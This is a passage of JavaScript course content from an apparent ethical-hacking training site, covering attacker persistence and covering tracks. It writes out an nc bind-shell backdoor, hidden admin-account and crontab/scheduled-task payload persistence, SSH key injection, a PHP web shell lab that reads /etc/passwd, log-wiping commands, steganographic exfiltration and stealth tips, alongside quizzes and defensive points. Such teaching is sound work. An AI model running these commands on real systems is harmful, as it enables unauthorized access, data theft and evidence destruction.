    {name:'Netcat (nc)',cmd:'nc -l -p 4444 -e /bin/bash',desc:'Can be set up as a simple listening backdoor'},
    {name:'Weevely',cmd:'weevely generate pass shell.php',desc:'Stealth PHP web shell generator'},
    {name:'Empire / Covenant',cmd:'(C2 Frameworks)',desc:'Advanced Command and Control frameworks designed specifically for persistence and stealth post-exploitation'}
  ],
  commands:{
    win:['net user hacker password123 /add','net localgroup administrators hacker /add','schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onstart'],
    lin:['echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys','echo "@reboot root /tmp/payload.sh" >> /etc/crontab']
  },
  pitfalls:[
    {icon:'⚠️',title:'Creating Obvious Accounts',desc:'Creating a user named "hacker" or "admin2" is an instant red flag to any basic security audit.',fix:'Attackers blend in. They create accounts that look like legitimate service accounts (e.g., "svc_sql_monitor") or re-enable disabled employee accounts.'},
    {icon:'🔴',title:'Relying on a Single Persistence Method',desc:'If you only install a backdoor in the registry, a good Antivirus sweep might find it and delete it, locking you out.',fix:'Professional attackers use redundant persistence. A web shell, a scheduled task, and compromised SSH keys across multiple different servers ensure access survives remediation attempts.'},
    {icon:'⛔',title:'Using Noisy Backdoors',desc:'Installing a backdoor that constantly connects out every 5 seconds generates massive, anomalous network traffic that the SOC will detect.',fix:'Use "sleep" intervals. Configure the backdoor (Command and Control agent) to check in randomly every 4 to 12 hours. This blends in with normal network traffic.'}
  ],
  lab:{
    title:'Lab: Web Shell Persistence',
    difficulty:'Beginner',
    duration:'20 min',
    objectives:['Understand how a web shell works','Upload a simple PHP web shell','Execute commands via a web browser'],
    steps:[
      'Assume you have already compromised a Linux web server (Metasploitable).',
      'Create a simple PHP web shell: echo "<?php system(\$_GET[\'cmd\']); ?>" > /var/www/html/hidden.php',
      'This file is now a permanent backdoor. As long as the web server is running, the attacker has access.',
      'Open your web browser and navigate to: http://[target_ip]/hidden.php?cmd=whoami',
      'The browser will display the output of the command (e.g., www-data).',
      'Change the command in the URL: http://[target_ip]/hidden.php?cmd=cat /etc/passwd'
    ],
    validation:'You should understand that a web shell provides a persistent, firewall-bypassing method of command execution that survives reboots and patching.'
  },
  quiz:[
    {q:'What is the primary goal of the "Maintaining Access" phase?',opts:['To discover open ports','To extract plaintext passwords','To ensure the attacker can return to the compromised system even if it is rebooted or the original vulnerability is patched','To crash the target system'],correct:2,fb:'Maintaining access (persistence) decouples the attacker\'s access from the initial vulnerability. They install backdoors so they can re-enter at will.'},
    {q:'Which of the following is a common method for achieving persistence on a Windows system?',opts:['Modifying the /etc/shadow file','Adding a malicious payload to the HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run registry key','Running a ping sweep','Exploiting a buffer overflow'],correct:1,fb:'The "Run" registry keys are executed every time Windows boots. Placing a payload here ensures the backdoor starts automatically when the server is restarted.'},
    {q:'What is a Web Shell?',opts:['A secure browser extension','A malicious script (PHP, ASPX) uploaded to a web server that allows an attacker to execute system commands via HTTP requests','A tool for analyzing HTML source code','A type of firewall'],correct:1,fb:'Web shells are incredibly popular for persistence because they communicate over port 80/443 (HTTP/HTTPS), which is almost always allowed through firewalls, blending in with normal web traffic.'},
    {q:'What makes a Rootkit fundamentally different from a standard Trojan or Backdoor?',opts:['A rootkit is written in Python','A rootkit modifies the core Operating System (Kernel) to actively hide its files, processes, and network connections from the administrator and antivirus','A rootkit is a hardware device','A rootkit only works on Linux'],correct:1,fb:'Standard backdoors can be seen in the task manager. A rootkit hooks deep into the OS to intercept queries, making itself completely invisible to standard system tools.'},
    {q:'How can an attacker establish persistence on a Linux server without installing any new software?',opts:['By adding their public SSH key to the root user\'s ~/.ssh/authorized_keys file','By deleting the /var/log directory','By running Nmap locally','By exploiting the Windows registry'],correct:0,fb:'Adding an SSH key to `authorized_keys` allows the attacker to log in as that user (e.g., root) via SSH at any time, without needing a password. It is a built-in OS feature used maliciously.'},
    {q:'What is a "Golden Ticket" attack?',opts:['Winning a bug bounty program','Forging a Kerberos Ticket Granting Ticket (TGT) after extracting the KRBTGT hash, granting the attacker domain-wide access for years','A VIP pass to a cybersecurity conference','A ransomware payment method'],correct:1,fb:'The Golden Ticket is the ultimate persistence mechanism in Active Directory. By compromising the central KRBTGT account, the attacker can forge authentication tickets for any user, bypassing password checks entirely.'},
    {q:'Why do professional attackers configure their persistence backdoors to use long "sleep" or "beaconing" intervals (e.g., checking in every 12 hours)?',opts:['To save battery power','To reduce the load on their own servers','To blend in with normal network traffic and avoid detection by SOC analysts monitoring for constant, anomalous outbound connections','Because the tools are slow'],correct:2,fb:'Stealth requires blending in. A backdoor connecting out every 5 seconds is incredibly noisy. Checking in randomly every few hours looks like legitimate background internet traffic.'},
    {q:'If an attacker compromises a web server and creates a new user account named "Administrator2", what is the primary flaw in this persistence strategy?',opts:['It is too slow','It relies on a vulnerability','It is highly visible and obvious; a basic audit by a defender will spot it immediately','It requires a reboot'],correct:2,fb:'Good persistence is stealthy. Attackers prefer to hijack existing service accounts or use naming conventions that blend in (e.g., "svc_sql_backup") rather than creating obvious, highly visible admin accounts.'},
    {q:'Which Metasploit payload feature is explicitly designed to ensure the attacker retains access?',opts:['The Port Scanner module','The Persistence module (which creates registry keys or scheduled tasks for the payload)','The Encoding module','The Exploit module'],correct:1,fb:'Metasploit includes post-exploitation modules specifically designed to automate the installation of persistence mechanisms (like registry run keys) for the Meterpreter payload.'},
    {q:'What defensive activity is explicitly designed to find attackers who have bypassed prevention controls and established persistence?',opts:['Vulnerability Scanning','Patch Management','Threat Hunting','Firewall Configuration'],correct:2,fb:'Threat Hunting is the proactive search through networks and endpoints to find advanced threats that evaded automated security controls and established persistence.'}
  ],
  flashcards:[
    {f:'Persistence',b:'The ability of an attacker to retain access to a compromised system across reboots and patching.'},
    {f:'Web Shell',b:'A malicious script (e.g., PHP, ASP) uploaded to a web server that executes OS commands via web requests.'},
    {f:'Rootkit',b:'Malware that deeply hooks into the OS Kernel to hide files, processes, and network connections from defenders.'},
    {f:'Registry Run Keys',b:'Windows registry locations where attackers place payloads to ensure they execute automatically on system boot.'},
    {f:'authorized_keys',b:'Linux file used for SSH authentication. Attackers add their keys here for silent, password-less persistence.'},
    {f:'Golden Ticket',b:'Forging Kerberos tickets using the compromised KRBTGT hash. Grants ultimate, long-term persistence in Active Directory.'},
    {f:'Beaconing',b:'The intermittent outbound connection made by a backdoor to its Command and Control (C2) server.'},
    {f:'Threat Hunting',b:'The defensive practice of proactively searching for persistence mechanisms and hidden attackers.'}
  ],
  ctf:{
    scenario:'You have root access on a Linux server. You want to ensure that a malicious script (`/tmp/backdoor.sh`) runs automatically every time the server reboots. What file should you edit to add the line `@reboot root /tmp/backdoor.sh`?',
    hint:'It is the table that manages scheduled tasks in Linux.',
    flag:'CEH{m41nt41n_4cc3ss_r00tk1t}',
    points:150
  },
  summary:[
    'Maintaining Access (Persistence) ensures survival after reboots or patching.',
    'Windows persistence relies on Registry Run Keys, Scheduled Tasks, and hidden accounts.',
    'Linux persistence relies on Cron jobs and adding SSH keys to authorized_keys.',
    'Web Shells provide stealthy, firewall-bypassing persistence on web servers.',
    'Rootkits provide the ultimate stealth by modifying the OS kernel to hide the attacker\'s actions.',
    'Active Directory persistence often utilizes Golden Tickets (forged Kerberos authentication).',
    'Incident Response must include Threat Hunting to eradicate persistence, not just patch the initial flaw.'
  ]
};

CONTENT['steganography'] = {
  module:'Module 06 · System Hacking',
  title:'Covering Tracks & Steganography',
  sub:'Hiding the evidence and exfiltrating data silently.',
  killchain:{phase:'Covering Tracks',mitre:'TA0005 — Defense Evasion',desc:'The final phase of the CEH methodology. Attackers wipe logs and hide stolen data inside legitimate files to evade detection and forensic investigation.'},
  learn:{
    simple:'Covering tracks involves deleting or modifying log files to erase evidence of the attack. Steganography is the art of hiding secret data inside a non-secret file (like a picture or audio file) so it can be exfiltrated without arousing suspicion.',
    analogy:'Covering tracks is a burglar wiping down the doorknobs for fingerprints and deleting the security camera footage. Steganography is the burglar walking out the front door hiding the stolen diamonds inside a hollowed-out loaf of bread.',
    why:'If an attacker leaves Nmap logs, web shell access logs, and Windows Event logs untouched, the SOC will quickly detect the breach and forensic analysts will map their exact actions. Furthermore, exfiltrating a file named "credit_cards.txt" will trigger Data Loss Prevention (DLP) alarms. Steganography bypasses DLP.',
    architecture:'Track covering targets central logging mechanisms (Windows Event Logs, Linux bash_history, Apache access logs). Steganography uses techniques like LSB (Least Significant Bit) insertion to replace the least important data in an image pixel with the secret data, changing the image so slightly the human eye cannot detect it.'
  },
  diagram:{
    title:'Defense Evasion & Exfiltration Techniques',
    steps:[
      {icon:'🗑️',label:'Log Deletion',desc:'Clearing the Windows Security, System, and Application event logs (e.g., using wevtutil or Meterpreter).'},
      {icon:'✏️',label:'Log Alteration (Timestomping)',desc:'Changing the creation/modification timestamps of malicious files to match legitimate OS files, hiding them from forensic timelines.'},
      {icon:'👤',label:'Clearing Command History',desc:'Deleting or linking /dev/null to the Linux ~/.bash_history file so executed commands are not recorded.'},
      {icon:'🖼️',label:'Steganography (Hiding)',desc:'Embedding stolen data (passwords, source code) inside a JPEG or WAV file.'},
      {icon:'📤',label:'Covert Exfiltration',desc:'Emailing the seemingly harmless JPEG out of the network. DLP and firewalls see it as a normal picture and allow it.'}
    ]
  },
  enterprise:{
    role:'You are an APT actor exfiltrating intellectual property from GlobalFinSec Corp.',
    situation:'You have compromised a developer\'s workstation and found the source code for the company\'s proprietary trading algorithm. The network has strict Data Loss Prevention (DLP) that blocks any files containing code or the word "algorithm" from leaving the network.',
    challenge:'Exfiltrate the source code without triggering the DLP system, and erase evidence of your actions.',
    steps:[
      'Steganography: Use Steghide to embed the source_code.zip file inside a large, high-resolution JPEG image of the company logo: steghide embed -cf logo.jpg -ef source_code.zip -p secretpass',
      'Exfiltration: Upload the modified logo.jpg to an external server or attach it to an email. The DLP system scans it, sees a valid JPEG structure with no restricted keywords, and allows it to pass.',
      'Covering Tracks: Use the Meterpreter "timestomp" command on the web shell you used to gain access, matching its creation date to the original web server installation date in 2019.',
      'Log Clearing: Clear the Windows Event logs using "wevtutil cl Security" and "wevtutil cl System".'
    ],
    outcome:'The source code was successfully exfiltrated. Because the logs were cleared and the web shell was timestomped, the incident response team spent weeks trying to determine how the breach occurred and exactly what data was taken.',
    lesson:'Steganography defeats content-inspection (DLP). Log clearing blinds forensic investigators. Centralized, append-only logging (sending logs to an immutable SIEM server immediately) is the only defense against log clearing.'
  },
  tools:[
    {name:'Steghide',cmd:'steghide embed -cf cover.jpg -ef secret.txt',desc:'Command-line steganography tool that hides data in image and audio files'},
    {name:'OpenStego',cmd:'(GUI Tool)',desc:'Open-source graphical steganography application'},
    {name:'Meterpreter (clearev)',cmd:'meterpreter > clearev',desc:'Wipes the Application, System, and Security event logs on a Windows target'},
    {name:'wevtutil',cmd:'wevtutil cl Security',desc:'Native Windows command-line utility to clear event logs'}
  ],
  commands:{
    win:['wevtutil cl System','wevtutil cl Security','wevtutil cl Application'],
    lin:['export HISTSIZE=0','cat /dev/null > ~/.bash_history','rm -rf /var/log/apache2/access.log']
  },
  pitfalls:[
    {icon:'⚠️',title:'Deleting the Entire Log File',desc:'An attacker deleting the entire Security log is a massive, glowing red flag to any SOC. It generates an Event ID (1102: The audit log was cleared) that triggers high-priority alerts.',fix:'Advanced attackers do not delete the entire log. They selectively edit the log to remove only their specific IP address or actions, leaving the rest intact. (This requires advanced tools).'},
    {icon:'🔴',title:'Forgetting Centralized Logging (SIEM)',desc:'Clearing logs on the local compromised server is useless if that server automatically forwards all logs to a central Splunk/SIEM server every second.',fix:'If a target uses centralized logging, the attacker must either disrupt the forwarding service before acting, or compromise the SIEM itself.'},
    {icon:'⛔',title:'Confusing Steganography with Cryptography',desc:'Cryptography scrambles data making it unreadable (but obviously a secret). Steganography hides the existence of the data entirely.',fix:'Attackers usually combine them: encrypt the data first (Cryptography), then hide the encrypted blob inside an image (Steganography).'}
  ],
  lab:{
    title:'Lab: Hiding Data with Steghide',
    difficulty:'Beginner',
    duration:'15 min',
    objectives:['Embed a secret file inside an image','Extract the secret file','Understand LSB steganography'],
    steps:[
      'Create a secret file: echo "Confidential Passwords" > secret.txt',
      'Download a sample JPEG image (e.g., cover.jpg).',
      'Embed the secret: steghide embed -cf cover.jpg -ef secret.txt (Enter a passphrase when prompted).',
      'Look at cover.jpg. It opens normally in an image viewer and looks identical to the original.',
      'Extract the secret: steghide extract -sf cover.jpg (Enter the passphrase).',
      'Read the extracted file: cat secret.txt'
    ],
    validation:'You should successfully hide a text file inside an image, demonstrating how attackers bypass DLP systems that look for specific file types or keywords.'
  },
  quiz:[
    {q:'What is the definition of Steganography?',opts:['The process of encrypting data using complex mathematical algorithms','The art and science of hiding secret data within non-secret files (like images or audio) so its existence is concealed','The process of clearing system logs','A type of password cracking attack'],correct:1,fb:'While cryptography hides the meaning of a message, steganography hides the very existence of the message by burying it in normal-looking files.'},
    {q:'What is the primary reason an attacker uses Steganography during the Exfiltration phase?',opts:['To compress the data and save bandwidth','To bypass Data Loss Prevention (DLP) systems and firewalls that would flag or block files containing sensitive data or code','To execute the payload on the target machine','To crack the passwords faster'],correct:1,fb:'DLP systems inspect outbound traffic for credit cards, source code, or keywords. By embedding this data inside a seemingly harmless JPEG, the DLP system sees only a picture and lets it pass.'},
    {q:'What is LSB (Least Significant Bit) insertion?',opts:['A method of clearing the bash history','A cryptography algorithm','A common steganography technique where the right-most bit of a pixel\'s color value is replaced with a bit of the secret data','A type of buffer overflow'],correct:2,fb:'LSB insertion modifies the least significant bit of pixel data. Changing this bit alters the color so slightly (e.g., from a specific shade of red to a shade 1/256th different) that the human eye cannot detect the change.'},
    {q:'In Windows, what does the command `wevtutil cl Security` do?',opts:['Encrypts the Security log','Clears (deletes) all entries in the Windows Security Event Log','Copies the Security log to a remote server','Scans the Security log for vulnerabilities'],correct:1,fb:'wevtutil is the native Windows Event Log utility. `cl` stands for clear log. Clearing the Security log is a classic track-covering technique to hide unauthorized logins.'},
    {q:'If an attacker clears the Windows Security Event Log, what specific Event ID is generated and recorded?',opts:['Event ID 4624','Event ID 1102 (The audit log was cleared)','Event ID 445','No event ID is generated'],correct:1,fb:'Clearing the log ironically leaves a massive forensic artifact: Event ID 1102. Modern SOCs configure high-priority alerts for this specific Event ID.'},
    {q:'What is "Timestomping"?',opts:['A denial-of-service attack that targets the NTP (Time) server','The process of modifying the MAC (Modified, Accessed, Created) timestamps of a malicious file to match legitimate OS files, hiding them from forensic timelines','Clearing the bash history','Waiting for a specific time to launch an attack'],correct:1,fb:'Forensic analysts often build timelines of an attack (e.g., "Show me all files created on Tuesday"). Timestomping allows attackers to change a backdoor\'s creation date to years ago, hiding it from the timeline.'},
    {q:'Which Metasploit command automatically wipes the Application, System, and Security event logs on a compromised Windows target?',opts:['hashdump','timestomp','clearev','getsystem'],correct:2,fb:'The `clearev` (Clear Event Logs) command in a Meterpreter session automatically wipes the three primary Windows event logs.'},
    {q:'How can an attacker prevent their commands from being saved to the Linux bash history file (~/.bash_history)?',opts:['By running `export HISTSIZE=0` or unsetting the HISTFILE variable','By encrypting the terminal','By running the commands as root','By using the `sudo` command for everything'],correct:0,fb:'Setting HISTSIZE to 0 prevents the bash shell from recording any executed commands into the history file, hiding the attacker\'s actions.'},
    {q:'Which tool is a popular command-line utility for hiding text or files inside JPEG and BMP image files?',opts:['Nmap','Steghide','John the Ripper','Wireshark'],correct:1,fb:'Steghide is a classic steganography tool that allows for embedding and extracting secret data from image and audio files.'},
    {q:'What is the most effective defensive strategy against an attacker attempting to cover their tracks by clearing local log files?',opts:['Disabling logging entirely to save disk space','Using centralized, append-only logging (like a SIEM), where logs are instantly forwarded to a secure server the attacker cannot access','Changing the administrator password daily','Using steganography defensively'],correct:1,fb:'If logs are instantly forwarded to a central SIEM (Splunk, Elastic), it doesn\'t matter if the attacker clears the local logs. The SIEM already has the immutable record of the attack.'}
  ],
  flashcards:[
    {f:'Covering Tracks',b:'The final CEH phase. Deleting logs and altering artifacts to evade detection and hinder forensic investigation.'},
    {f:'Steganography',b:'The art of hiding secret data within non-secret files (images, audio) to conceal its existence.'},
    {f:'LSB Insertion',b:'Least Significant Bit. A steganography technique replacing the least important bit of pixel data with secret data.'},
    {f:'Timestomping',b:'Modifying the MAC (Modified, Accessed, Created) timestamps of a file to hide it from forensic timelines.'},
    {f:'clearev',b:'Meterpreter command that wipes the Windows Application, System, and Security event logs.'},
    {f:'Event ID 1102',b:'The Windows Event ID generated when the audit log is cleared. A critical SOC alert.'},
    {f:'HISTSIZE=0',b:'Linux command to disable the recording of commands in the bash history file.'},
    {f:'Centralized Logging (SIEM)',b:'The primary defense against log clearing. Logs are forwarded instantly to a secure, separate server.'}
  ],
  ctf:{
    scenario:'You use the Meterpreter shell to cover your tracks on a Windows system. You want to wipe the Application, System, and Security logs all at once using the built-in Meterpreter command. What is the command?',
    hint:'It stands for Clear Event logs.',
    flag:'CEH{st3g0_c0v3r_tr4cks}',
    points:150
  },
  summary:[
    'Covering Tracks hinders forensics and delays detection.',
    'Windows track covering involves clearing logs (wevtutil, clearev) and timestomping files.',
    'Linux track covering involves clearing or disabling ~/.bash_history.',
    'Clearing the Windows Security log generates Event ID 1102 (a massive red flag).',
    'Steganography (like Steghide) hides data inside images/audio to bypass DLP exfiltration filters.',
    'LSB insertion is the most common steganography technique.',
    'Centralized logging (SIEM) is the only reliable defense against local track covering.'
  ]
};


// ==========================================================
// AUTO-STUB GENERATOR -- fills all topics without content
// ==========================================================
(function(){
  function makeStub(module,title,sub,flag){
    return {module,title,sub,
      killchain:{phase:'Coming Soon',mitre:'TBD',desc:'Content is being prepared.'},
      learn:null,diagram:null,enterprise:null,
      tools:[],commands:{win:[],lin:[]},pitfalls:[],lab:null,
      quiz:[],flashcards:[],
      ctf:{scenario:'Complete the topic learning to unlock this CTF.',hint:'Study the Learn and Commands tabs first.',flag:flag,points:150},
      summary:[]
    };
  }
  MODULES.forEach(m=>{
    const mNum=m.id.replace('m','').padStart(2,'0');
    m.topics.forEach(t=>{
      if(!CONTENT[t.id]){
        CONTENT[t.id]=makeStub(
          'Module '+mNum+' · '+m.name, t.name,
          'Content for this topic is being prepared by ShadowXLab analysts.',
          'CEH{'+t.id.replace(/-/g,'_')+'_2026}'
        );
      }
    });
  });
})();

// ==========================================================
function initParticles(){
  const canvas = document.getElementById('particles');
  const ctx = canvas.getContext('2d');
  let W=canvas.width=window.innerWidth, H=canvas.height=window.innerHeight;
  let mx=W/2, my=H/2;
  const nodes = Array.from({length:80},()=>({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,r:Math.random()*2+1}));
  window.addEventListener('resize',()=>{W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;});
  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
  function draw(){
    ctx.clearRect(0,0,W,H);
    nodes.forEach(n=>{
      n.x+=n.vx; n.y+=n.vy;
      if(n.x<0||n.x>W) n.vx*=-1;
      if(n.y<0||n.y>H) n.vy*=-1;
      const dx=mx-n.x, dy=my-n.y, dist=Math.sqrt(dx*dx+dy*dy);
      if(dist<120){ n.x+=dx*.005; n.y+=dy*.005; }
      ctx.beginPath();
      ctx.arc(n.x,n.y,n.r,0,Math.PI*2);
      ctx.fillStyle='rgba(0,255,136,0.4)';
      ctx.fill();
    });
    for(let i=0;i<nodes.length;i++) for(let j=i+1;j<nodes.length;j++){
      const dx=nodes[i].x-nodes[j].x, dy=nodes[i].y-nodes[j].y, d=Math.sqrt(dx*dx+dy*dy);
      if(d<120){ ctx.beginPath(); ctx.moveTo(nodes[i].x,nodes[i].y); ctx.lineTo(nodes[j].x,nodes[j].y); ctx.strokeStyle=`rgba(0,255,136,${0.06*(1-d/120)})`; ctx.stroke(); }
    }
    requestAnimationFrame(draw);
  }
  draw();
}

// ═══════════════════════════════════════════════════════════
// INIT
// ═══════════════════════════════════════════════════════════
checkAuth();
